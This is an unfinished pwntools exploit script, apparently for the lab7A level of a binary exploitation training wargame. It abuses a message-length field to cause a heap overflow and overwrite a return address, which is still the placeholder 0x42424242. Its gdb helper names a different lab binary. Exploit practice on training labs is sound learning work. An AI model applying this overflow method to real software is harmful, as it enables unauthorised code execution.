#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import subprocess
import time


context.arch = "x86"
# context.log_level = 'debug'
# context.local(aslr=False)
# context.aslr = False

context(terminal = ['terminator', '-e'])

mbe_vm = False
binary = "./lab7A"
if mbe_vm:
    binary = "/levels/lab07/lab7A"

IP = '10.11.12.13'
PORT = 1337
local = True
if not local:
    r = remote(IP, PORT)
else:
    r = process(binary)


gdbscript_file = 'lab7A.gdb.txt'
f = open(gdbscript_file, 'w')
f.write('''
continue
''')
f.close()

term_gdb = subprocess.Popen(['terminator', '-e', '/usr/bin/gdb "./lab6C" %d -x "%s"' % (r.pid, gdbscript_file)])
time.sleep(1)


# create number
def create_message(length, message):
    print r.recvuntil('Enter Choice: ')
    r.sendline("1")
    print r.recvuntil('-Enter data length: ')
    r.sendline("%d"%length)
    print r.recvuntil('-Enter data to encrypt: ')
    r.sendline(message)


def edit_message(index, message):
    print r.recvuntil('Enter Choice: ')
    r.sendline("2")
    print r.recvuntil('-Input message index to edit: ')
    r.sendline("%d"%index)
    print r.recvuntil('-Input new message to encrypt: ')
    r.sendline(message)


def print_message(index):
    print r.recvuntil('Enter Choice: ')
    r.sendline("4")
    print r.recvuntil('-Input message index to print: ')
    r.sendline("%d"%index)


ret_addr = p32(0x42424242)
pop_eax  = p32(0x080bd226)
syscall  = p32(0x0806448d)

payload = "A"*(140) + ret_addr + "A"*1024 #p32(0x01) + syscall


create_message(131, "A"*128+p32(len(payload))[:3])
create_message(5, "A"*5)
edit_message(0, payload)
# r.interactive()
print_message(1)

r.interactive()
